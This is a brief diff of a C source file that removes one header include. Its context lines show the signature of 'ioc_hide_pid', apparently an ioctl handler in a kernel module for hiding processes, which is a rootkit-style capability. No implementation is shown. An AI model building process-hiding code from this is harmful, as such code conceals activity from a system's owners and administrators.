@@ -18,7 +18,6 @@
 
 #include "logging.h"
 #include "ctrl/ctrl.h"
-#include "device/details/hash_tbl.h"
 #include "device/details/ioctl_cmd.h"
 
 int ioc_hide_pid(module_dev_t* p_dev, pid_t pid)
